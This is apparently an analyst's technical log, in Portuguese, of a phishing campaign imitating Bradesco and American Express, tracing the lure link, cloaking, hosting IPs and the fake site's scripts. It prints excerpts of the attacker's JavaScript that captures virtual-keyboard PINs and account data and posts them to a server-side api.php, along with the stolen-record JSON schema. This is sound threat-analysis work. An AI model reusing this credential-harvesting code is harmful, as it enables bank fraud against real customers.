# Log Técnico da Análise - Campanha de Phishing Bradesco/American Express

**Analista:** Patrícia Canossa Gagliardi  
**Data da análise:** 27/10/2025  
**Ambiente:** VM isolada Windows 10 (sem rede principal, snapshot ativo) / VM Kali Linux (com rede principal) / Máquina Windows 11 (com rede principal)
**Objetivo:** Coletar, analisar e registrar evidências da campanha de phishing direcionada a clientes Bradesco.

# 1 - Extração de link malicioso de email

Inicialmente, foi extraído do email, seu conteúdo header e body, obtendo-se o link malicioso contido no botão do email.

```HTML
<td align="center">
                    <a href="https://redexclusiv-975736767249.southamerica-east1.run.app" target="_blank" style="background-color:#d4af37; color:#000000; padding:16px 40px; text-decoration:none; font-size:17px; border-radius:6px; display:inline-block; font-weight:bold; font-family:Arial, Helvetica, sans-serif; text-transform:uppercase; letter-spacing:1px; mso-line-height-rule:exactly; line-height:20px;">
                      ACEITAR CONVITE
                    </a>
                  </td>
```                  
# 2- Busca de IP do link malicioso

Tentativa de localizar o IP da url contida no corpo do email.

```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup https://redexclusiv-975736767249.southamerica-east1.run.app/
Server:         192.168.192.2
Address:        192.168.192.2#53

** server can't find https://redexclusiv-975736767249.southamerica-east1.run.app/: NXDOMAIN
```

```Bash
┌──(kali㉿kali)-[~]
└─$ ping redexclusiv-975736767249.southamerica-east1.run.app 
PING v2.run.app (34.143.78.2) 56(84) bytes of data.
64 bytes from 34.143.78.2: icmp_seq=1 ttl=128 time=16.8 ms
64 bytes from 34.143.78.2: icmp_seq=2 ttl=128 time=16.9 ms
64 bytes from 34.143.78.2: icmp_seq=3 ttl=128 time=16.4 ms

--- v2.run.app ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2010ms
rtt min/avg/max/mdev = 16.404/16.694/16.855/0.205 ms
```

# 3- Análise do IP Obtido

A análise do IP obtido, foi realizado de forma automatizada, com uso de script em Python, nas plataformas Shodan, IPInfo.io, ARIN/RIPE WHOIS & RDAP, URLScan.io, e bases públicas de reputação utilizadas pelas plataformas, e analisados dados com geração de relatório markdown através de LLM gpt-oss 120b via Ollama Cloud ``ip-analysis.py``.

A análise retornou os pontos de importância:

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|--------------|
| **Shodan** | Portas 80 e 443 abertas; resposta HTTP 404; tag *self‑signed* | Serviço web/HTTPS ativo, mas sem conteúdo público (404). O certificado auto‑assinado pode indicar uso interno ou teste. |
| **IPInfo.io** | Organização “Google LLC”, ASN AS396982, localização “Mountain View, CA” | IP alocado para infraestrutura Google Cloud – uso típico por clientes da GCP. |
| **ARIN / RDAP** | Registro mostra que a faixa **34.128.0.0/10** pertence à Google (GOOGL‑2) e que “os endereços estão em uso por clientes Google Cloud”. | Não há indicação de propriedade maliciosa direta. |
| **URLScan.io** | Não há resultados associados ao IP (nenhum URL capturado). | Falta de tráfego público ou de análise de URLs apontando para este IP. |
| **Análise de vulnerabilidades** | Nenhuma CVE listada no Shodan. | Não há vulnerabilidades conhecidas divulgadas para os serviços expostos (Apache/Nginx etc.). |

**Conclusão comportamental**: O host parece ser um ponto de terminação de infraestrutura de nuvem (possivelmente usado por um cliente da Google Cloud para hospedagem de serviços web ainda não configurados ou em fase de teste). Não foram encontradas evidências de comunicação com botnets, servidores de C2 ou de scanners automatizados. 

A análise, constatou, que o link de acesso, presente no email, não era a página maliciosa em si, mas sim, um serviço hospedado na Google Cloud.

# 4- Tentaiva de Acesso por VM Kali Linux

A tentativa de acesso do link fornecido pelo email, direcionava para um site legítimo do blog.veroo:

``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``

Analisado o IP pelo IPInfo.io, para verificar se era um "IP doméstico", retornando-o como um
```JSON
ipinfo:ip "170..."
hostname "170-..."
city "..."
region "..."
country "BR"
loc "-21...."
org "..."
postal "..."
timezone "America/Sao_Paulo"
readme "https://ipinfo.io/missingauth"
```
*Dados Ocultados por Motivos de Privacidade e Proteção de Dados*

A análise, constatou, que o redirecionamento, não estava ocorrendo pelo IP, sendo antão, realizada a tentativa de acesso à página maliciosa, através do uso de curl com header "falso" de navegador chrome e SO Windows.

```Bash
┌──(kali㉿kali)-[~/CloudPeler]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" -L "www.redexclusiv-975736767249.southamerica-east1.run.app/"

<html><head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>404 Page not found</title>
</head>
<body text=#000000 bgcolor=#ffffff>
<h1>Error: Page not found</h1>
<h2>The requested URL was not found on this server.</h2>
<h2></h2>
</body></html>
```

Esse comportamento, mostrou que o sistema por trás do phishing inicial, possui um cloacking, com identificação eficaz so So utilizado pelo usuário, provavelmente, presente no aplicativo hospedado na Google Cloud, que impede o acesso de SO Linux.

# 5- Acesso do site malicioso via VM Windows 10

Para burlar o filtro existente de acesso, o link presente no email, foi acessado através de uma máquina VM em Windows 10, direcionando para o site malicioso com o link:

``https://bradescard-americanblackexclusivo.com``

# 6- Busca de IP do domínio após direcionamento para site malicioso

A busca pelo IP, foi realizada por um rápido comando ping retornando o IP ``172.86.126.117``

```Bash
┌──(kali㉿kali)-[~]
└─$ ping bradescard-americanblackexclusivo.com

(24-10-2025)Disparando bradescard-americanblackexclusivo.com [172.86.126.117] com 32 bytes de dados:
Resposta de 172.86.126.117: bytes=32 tempo=184ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52

Estatísticas do Ping para 172.86.126.117:
    Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de
             perda),
Aproximar um número redondo de vezes em milissegundos:
    Mínimo = 184ms, Máximo = 185ms, Média = 184ms

```

O acesso ao site malicioso, foi realizado novamente após 4 dias, e foi observado esse estar apontando para outro IP ``172.237.50.16``

```BASH
┌──(kali㉿kali)-[~]
└─$ nslookup bradescard-americanblackexclusivo.com                                                            
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   bradescard-americanblackexclusivo.com
Address: 172.237.50.16
```

# 7- Análise do IP Obtido ``172.86.126.117`` e ``172.237.50.16``


A análise do IP obtido foi realizada pelo script automatizado em Python já descrito anteriormente, sendo obtido os principais pontos:

**Análise de Comportamento** 

| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Hostname suspeito** | `bradescard-americanblackexclusivo.com` (domínio que lembra marca de cartão de crédito) | Alto potencial de uso em campanha de phishing (brand‑jacking). |
| **Presença em PhishTank** | Dois scans (IDs 0199c5d6, 0199be39) apontam URLs de phishing que redirecionam para Google | O domínio está **listado como phishing**. |
| **Redirecionamento HTTP 302** (Porta 80/443) | Ambos retornam `Location: https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/` | O servidor funciona como **proxy de redirecionamento**; pode estar sendo usado para mascarar o destino final. |
| **Porta 22 aberta (OpenSSH 8.2p1)** | Banner expõe versão completa e chave RSA | Facilita **ataques de força‑bruta** ou exploração de vulnerabilidades de SSH já corrigidas (ex.: CVE‑2018‑15473). |
| **Versão do Apache (2.4.41)** | Listada no Shodan; CVE database mostra **>90 vulnerabilidades**, incluindo execuções remotas, SSRF e bypass de controle de acesso. | **Superfície de ataque crítica** – fácil exploração por scanners automatizados. |
| **Geolocalização divergente** | Shodan → Canada (Vancouver); ipinfo.io → US (Los Angeles) | Provável uso de **IP Anycast / CDN** ou imprecisão de bases de dados – não afeta a análise de risco. |
| **ASN/ISP** | AS14956 – RouterHosting LLC (provedor de data‑center) | Não há indícios de que o provedor seja “malicioso”, mas hospeda clientes com comportamento suspeito. |

* O hostname configurado é **bradescard‑americanblackexclusivo.com**, que aparece em múltiplas submissões ao **phish‑tank** e a resultados do **urlscan.io**, indicando uso como página de **phishing bancário** que redireciona para domínios externos (por exemplo, Google).  
* O endereço **172.86.126.117** está sendo usado como **infra‑estrutura de phishing** e executa um **servidor web desatualizado** que contém diversas vulnerabilidades críticas, além de um serviço SSH aberto.  A combinação de **exposição pública**, **software vulnerável** e **participação em campanhas de engodo** torna este IP uma **ameaça de alto risco** para quaisquer redes que interajam com ele.  
*  **Verificar a resolução DNS** do domínio: atualmente ele resolve para **162.241.2.55** (outro IP). Confirme se há **CNAME** ou redirecionamento mal‑configurado. Avalie a necessidade de **takedown** do domínio através de registrador ou fornecedor de hospedagem (phishing).


**Análise de Comportamento**

| Fonte | Indicador | Avaliação |
|-------|-----------|-----------|
| **Shodan** | Nenhum serviço ou porta revelada (404) | Não há evidência de exposição direta a internet. |
| **IPInfo.io** | ISP: *Akamai Connected Cloud* (Linode) | IP pertence a provedor de cloud – uso legítimo esperado. |
| **ARIN / RDAP** | Organização: *Linode* (ASN 63949) | Bloqueio de rede típica de data‑center, sem informação de abuso. |
| **URLScan.io** | Nenhum resultado (0 scans) | Não foi registrado nenhum acesso HTTP/HTTPS ao IP. |
| **Feeds de ameaças públicos** (consulta externa) | **Não encontrado** em listas de botnets, C2 ou phishing conhecidas. | Não há correlação com campanhas conhecidas. |

O endereço `172.237.50.16` pertence à rede da **Linode**, um provedor de infraestrutura em nuvem, e está associado ao bloco IPv4 172.232.0.0/13, alocado à **Akamai Connected Cloud**. Geograficamente, está localizado em **Diadema, São Paulo, Brasil**. As consultas ao Shodan retornaram **“404: Not Found”**, indicando ausência de serviços expostos ou portas abertas conhecidas no momento da coleta. Não foram identificadas vulnerabilidades (CVEs) associadas a serviços detectados. Não há indicadores claros de atividade maliciosa (botnet, scanners, C2), embora a natureza de provedores de nuvem permita que o IP seja reutilizado por diversos clientes, inclusive por atores maliciosos.

**Conclusão:** Não há sinais atuais de comportamento malicioso direto. Contudo, a ausência de portas abertas pode ser temporária ou fruto de políticas de firewall restritivas; o IP pode ser usado como ponto de salto ou para serviços internos ainda não indexados.

A análise, permitiu verificar, que a troca do direcionamento do domínio do IP ``172.86.126.117`` para o ``172.237.50.16``, permitiu diminuir sua detecção, por esse ainda não apresentar-se como malicioso como o anterior já indexado em Virus Total e PhishTank.

# 8- Análise do Site Malicoso

O design para construção, possuia alta semelhança com recursos do site original, mostrando o uso bem aplicado de fatores que a credibilidade ao acessar o site, e grande quantidade de cópia de código do site original quando analisado o HTML.
Foi observado também, utilizando o dev tools do edge, alguns scripts em javascript, criados pelo atacante, que diferem em nome do site original, porém, com função igual aos presentes no site original, e presença de scripts para rastreamento de comportamento da vítima, para provável uso posterior em novas campanhas phishing.

# 9- Análise de arquivos javascript

Os arquivos javascript do site, foram obtidos através da listagem dentro da opção ``Aplicativo``, do dev tools do egde. Dentre os scripts observados, os que apresentavam comportamentos maliciosos, foram:

``navegg.js``
    * coleta de dados da vítima com uso da plataforma **Navegg**
``lembrarAgCta.js``
    * Esse script cria, lê e grava cookies contendo dados de login bancário: ``agência``, ``conta`` e ``dígito``. Ele utiliza Base64 (codificação simples, não criptografia) para “mascarar” os dados e armazená-los no navegador do usuário, mais precisamente em um cookie chamado ``lbAgCta``.
``fbevents.js``
    * Biblioteca oficial da **Meta** para medir desempenho de anúncios, otimização de conversão e retargeting, para provável uso posterior em novas campanhas phishing.
``validaFormNaoCorrentista.js``
    * Conjunto de funções trata basicamente de validação/entrada de CPF pela UI, manutenção de um tooltip/modal, e envio do CPF (e metadados) para um endpoint remoto quando a vítima seleciona opção de não correntista. O código é uma exfiltração de dados sensíveis (roubo de CPF), e assim, é altamente malicioso, por realizar coleta deliberada de dados pessoais para fraude. O comportamento (validar e postar CPF com meta-dados) é legítimo para remarketing em sites autorizados, mas é crítico quando encontrado em páginas fraudulentas
``detect-mobile.js``
    * Ele detecta o sistema (iOS/Android) pelo userAgent e substitui/ajusta links no DOM para apontarem para um deep‑link/URL (``https://www.bradescocelular.com.br/app_redirect/...``). Em um site de phishing essa funcionalidade é útil para o atacante — redirecionar usuários móveis para páginas/aplicativos falsos (ou para um crafted deep link) aumenta a chance de capturar credenciais/instalar app malicioso.
``one-tag.js``
    * É um **script malicioso** projetado para phishing bancário. O código intercepta o clique de botões com valor ``OK`` e lê os valores de campos HTML com IDs ``AGN`` (agência) e ``CTA`` (conta), combina os valores em um identificador de conta (financialAcctNbr) junto com o código do banco (``237 → Bradesco``), e envia esse identificador para um servidor remoto (``customerApi.sendProperties``), provavelmente controlado pelo atacante. O script visa coletar informações sensíveis de contas bancárias de clientes do Bradesco e enviar para um servidor externo, tudo disfarçado de interações normais no site. Isso caracteriza phishing bancário altamente sofisticado.
    * O script referencia o domínio ``thunderhead.com``, cujo IP obtido através de nslookup aponta para o IP ``141.193.213.20``, que após análise pelo ``ip-analysis.py``, foi observado que é de propriedade da Cloudflare, e associado há diversos serviços CDN. Também URLs que verdadeiras do Bradesco (``banco.bradesco``, ``ib12.bradesco.com.br``), aparentemente para disfarçar ou registrar interações do usuário.
```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup thunderhead.com                      
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   thunderhead.com
Address: 141.193.213.21
Name:   thunderhead.com
Address: 141.193.213.20
```
A chamada do script era realizada pelo cdn hospedado na ``thunderhead.com`` -> ``ns5.cdn.thunderhead.com``, com credenciais ``one-tag.js?siteKey=ONE´-WDA4KRKODB-1484``, verificado via dev tools em fontes.

``index.js``
    * Basicamente, isso é um formulário de login bancário, que verifica se os dados digitados são consistentes. Esse script manipula diretamente agência, conta e dígito, ou seja, informações financeiras sensíveis. Ele não é apenas “um código de validação normal”, pois também coleta dados bancários sensíveis (agência, conta, dígito) para posterior envio para quem está controlando o site malicioso através de funções ``ValidaNextAgencia()`` e ``ValidaLogin()`` .

# 10- Análise do HTML

Na análise do HTML, foi possível ver a criação de uma arquitetura semelhante ao do banco verdadeiro, porém, com presença de artefatos deixados ao longo do código, como um endereço de IP ``88.221.161.37``, e execução de scripts maliciosos. 

```HTML
 <tr>
    <td class="line-number" value="8960"></td>
    <td class="line-content"> <span class="html-attribute-name">maxlength</span>="<span
            class="html-attribute-value">4</span>" <span class="html-attribute-name">onblur</span>="<span
            class="html-attribute-value">ValidaNextAgencia(this.value);</span>"&gt;
    </td>
</tr>
```

```HTML
<tr>
    <td class="line-number" value="8896"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/validaFrame.js"
                rel="noreferrer noopener">js/validaFrame.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span>
    </td>
</tr>
<tr>
    <td class="line-number" value="8897"></td>
    <td class="line-content"> <span class="html-comment">&lt;!-- &lt;script
            src="js/valida_agenciaconta.js"&gt;&lt;/script&gt; --&gt;</span>
    </td>
</tr>
<tr>
    <td class="line-number" value="8898"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/lembrarAgCta.js"
                rel="noreferrer noopener">js/lembrarAgCta.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span>
    </td>
</tr>
```

```HTML
<tr>
    <td class="line-number" value="4087"></td>
    <td class="line-content"> var ipcli = '88.221.161.37';
    </td>
</tr>
```

O IP encontrado no código HTML, foi analisado, não sendo observado nenhum dado que demonstre a participação desse dentro da campanha de phishing, ou conter filtros de análise que impeçam de ser acessado.

**Análise de Comportamento**

| Fonte | Evidência | Interpretação |
|-------|-----------|----------------|
| **Shodan** | Página “404 Not Found” – “No information available for 88.221.161.37”. | O serviço de varredura não recebeu resposta ou foi bloqueado. Pode indicar que o IP está configurado para recusar sondas não‑HTTP ou que a camada de proteção da Akamai filtra o tráfego de scanners. |
| **IPInfo.io** | Hostname apontando para *static.akamaitechnologies.com*; localização em Dallas. | Confirma que o IP é parte da infraestrutura de entrega de conteúdo da Akamai (serviços estáticos). |
| **ARIN / RIPE (RDAP)** | Registro “AKAMAI‑PA”, entidade “AKAM1‑RIPE‑MNT” e “NARA1‑RIPE”, contato de abuso *abuse@akamai.com*. | Atribuição formal a Akamai; não há indicação de cliente final ou de host comprometido. |
| **URLScan.io** | Nenhum resultado (nenhum site submetido para análise). | Não há indicadores de que o IP esteja hospedando páginas suspeitas reconhecidas por essa plataforma. |
| **Feeds de ameaças públicos (consultas ad‑hoc)** | Não encontrado em AbuseIPDB, VirusTotal, AlienVault OTX, etc. | Falta de reputação negativa consolidada. |

**Avaliação geral:** O IP não apresenta sinais típicos de botnet, scanner ou servidor C2. O comportamento padrão de um ponto de presença de CDN (aceitar HTTP/HTTPS e recusar outras sondas) pode gerar “falsos negativos” em ferramentas como Shodan, mas isso não indica atividade maliciosa.

# 11- Login com Dados de Conta Bancária

Para acessar página a ser exibida após informar dados de conta bancária, foi informado dados de conta fictícia. O fornecimento dos dados, levou a uma página chamada ``indetificacao.php``. A página exibe um teclado virtual, simulando ao também encontrado em login da página verdadeiro do banco.
Essa página, também fazia comunicação com uma api server side chamada ``api.php`` que se mantinha em constante chamada, e retornava dados em formato JSON, contendo dados capturados da vítima, enviados ao centro de comando e controle. Os dados presente na estrtura do JSON, demonstram que a mesma api, é utilizada em outras companhas para roubo de dados extra bancários.
Ao fornecer os quatro números pelo teclado virtual, esses eram incluidos na estrutura JSON de resposta da ``api.php``, mostrando o roubo dos dados e envio ao servidor em que a api mentinha-se.

```JSON
{"id":"14...",
"0":"14...",
"idAcesso":"246...",
"1":"246...",
"agencia":"...",
"2":"...",
"conta":"...",
"3":"...",
"digito":"...",
"4":"...",
"senha4":"",
"5":"",
"comando":"SENHA_DE_4",
"6":"SENHA_DE_4",
"texto":null,
"7":null,
"ultimoAcesso":"2025-10-24 18-47-42",
"8":"2025-10-24 18-47-42",
"aberto":"0",
"9":"0",
"celular":null,
"10":null,
"cvv":null,
"11":null,
"senha6":null,
"12":null,
"statusInfo":"NOVO",
"13":"NOVO",
"qrCodeFile":null,
"14":null,
"titular":null,
"15":null,
"nome":null,
"16":null,
"tipo":"Bradesco",
"17":"Bradesco",
"serialDispositivo":null,
"18":null,
"saldo":null,
"19":null,
"cpf":null,
"20":null,
"mae":null,
"21":null}
```

# 12- Análise do documento ``ìdentificacao.php``

A análise do documento php, através do dev tools, tanto de seu código fonte, quanto pela aba fontes do dev tools, exibiu a execução de um script em javascript, que essa, por sua vez, realizava o roubo dos dados da página e comunicação com a ``api.php``

```HTML
<tr>
    <td class="line-number" value="384"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/identificacao.js"
                rel="noreferrer noopener">js/identificacao.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span></td>
</tr>
```

# 13- Análise do script ``identificacao.js``

A análise do script, permitiu observar a captura dos dados digitados no teclado virtual e já obtidos pela página de acesso pela conta bancária, sua direta comunicação com a ``api.php`` e envio desses, demonstrando o método de roubo da senha de teclado virtual, objetivo dessa campanha phishing.

```JAVASCRIPT
 function loadInfo(){
        $.ajax({
            url: "api.php",
            type:'POST',
            dataType : "json",
            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
            cache: false,
            success: function(r){
                info = r;
                if(r.comando !== status) {
                    status = r.comando;
                    atualizarTela();
                }
            }
        });
    }
```

```JAVASCRIPT
$('ul#ul_teclado_virtual a').click( e => {
        e.preventDefault();
        let value = $(e.target).text().trim();

        if(value === 'Limpar'){
            zerarSenhaDe4();
        } else {

            let pass1 = $('input#txtPass1').val();
            let pass2 = $('input#txtPass2').val();
            let pass3 = $('input#txtPass3').val();
            let pass4 = $('input#txtPass4').val();

            if(pass1.length == 0){
                $('input#txtPass1').val(value);
            } else if(pass2.length == 0){
                $('input#txtPass2').val(value);
            } else if(pass3.length == 0){
                $('input#txtPass3').val(value);
            } else if(pass4.length == 0){
                $('input#txtPass4').val(value);
                $('#btnAcessarSenha4').addClass('btn-action-active');
            }

        }

    });
```

```JAVASCRIPT
function atualizarTela(){

        $('div.boxes').addClass('hide');
        $('span.txt_msg_erro_disp').addClass('hide');


        if(status === 'AGUARDANDO'){
            $('div#boxAguardando').removeClass('hide');
        }
        if(status ==='SENHA_DE_4'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4').removeClass('hide');
        }
        if(status ==='SENHA_DE_4_ERRO'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4 span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxSenha4').removeClass('hide');
        }
```

```javascript
 $('div#conteudo').on('click', 'div#boxSenha4 button#btnAcessarSenha4.btn-action-active', function(e) {

        e.preventDefault();

        let s4_1 = $('#txtPass1').val();
        let s4_2 = $('#txtPass2').val();
        let s4_3 = $('#txtPass3').val();
        let s4_4 = $('#txtPass4').val();

        let senhaDe4 = s4_1 + '' + s4_2 + '' + s4_3 + '' + s4_4;

        if(senhaDe4.length !== 4){
            $('div#boxSenhaDe4').find('.box_redLine_bottom').addClass('form_erro');
            return;
        }

        info.senha4 = senhaDe4;
        info.comando = 'AGUARDANDO';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                zerarSenhaDe4();
                // MODIFICAÇÃO: Pula direto para a tela de loading sem mostrar o campo do celular
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });
```

A página mantém comunicação com a ``api.php`` de forma constante.

```javascript
var timer = setInterval ( function(){
        loadInfo();
    }, 2000 );


    loadInfo();
```

Ao digitar a senha no teclado virtual, é retornado um aviso de processamento na página, que após alguns segundos, é redirecionada para a página inicial.

```JAVASCRIPT
$.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#celular').val('');
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });

```

# 14- Observação sobre a ``api.php``

Embora tentando seu acesso, não foi possível, por estar sendo executada em server side. Quando tentado seu acesso via ``https://bradescard-americanblackexclusivo.com/api.php``, foi exibido um documento vazio.




